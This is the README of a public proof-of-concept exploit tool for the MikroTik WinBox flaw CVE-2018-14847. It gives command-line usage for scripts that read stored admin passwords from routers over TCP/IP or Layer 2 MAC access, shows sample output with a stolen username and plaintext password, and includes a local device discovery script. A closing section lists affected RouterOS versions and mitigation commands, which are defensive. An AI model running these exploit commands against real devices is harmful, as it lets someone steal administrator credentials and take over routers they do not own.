# WinboxExploit
This is a proof of concept of the critical WinBox vulnerability (CVE-2018-14847) which allows for arbitrary file read of plain text passwords.

## Blogpost
https://n0p.me/winbox-bug-dissection/

## Requirements
- Python 3+

This script will NOT run with Python 2.x or lower.

## How To Use
The script is simple used with simple arguments in the commandline.

#### WinBox (TCP/IP)
Exploit the vulnerability and read the password.
```
python3 WinboxExploit.py <IP-ADDRESS> [PORT]
```
Example:
```
$ python3 WinboxExploit.py 172.17.17.17
Connected to 172.17.17.17:8291
Exploit successful
User: admin
Pass: Th3P4ssWord
```

#### MAC server WinBox (Layer 2)  
You can extract files even if the device doesn't have an IP address.

Simple discovery check for locally connected Mikrotik devices.
```
python3 MACServerDiscover.py
```
Example:
```
$ python3 MACServerDiscover.py
Looking for Mikrotik devices (MAC servers)

    aa:bb:cc:dd:ee:ff 

    aa:bb:cc:dd:ee:aa
```

Exploit the vulnerability and read the password.
```
python3 MACServerExploit.py <MAC-ADDRESS>
```
Example:
```
$ python3 MACServerExploit.py aa:bb:cc:dd:ee:ff

User: admin
Pass: Th3P4ssWord
```

## Vulnerable Versions
All RouterOS versions from 2015-05-28 to 2018-04-20 are vulnerable to this exploit.

Mikrotik devices running RouterOS versions:

- Longterm: 6.30.1 - 6.40.7
- Stable: 6.29 - 6.42
- Beta: 6.29rc1 - 6.43rc3

## Mitigation Techniques
- Upgrade the router to a RouterOS version that include the fix. 
- Disable the WinBox service on the router.
- You can restricct access to the WinBox service to specific IP-addresses wtih the following:
```
/ip service set winbox address=10.0.0.0/8,172.16.0.0/12,192.168.0.0/16
```
- You may use some Filter Rules (ACL) to deny external access to the WinBox service:
```
/ip firewall filter add chain=input in-interface=wan protocol=tcp dst-port=8291 action=drop
```
- Limiting access to the mac-winbox service can be done by specifing allowed interfaces:
```
/tool mac-server mac-winbox
```
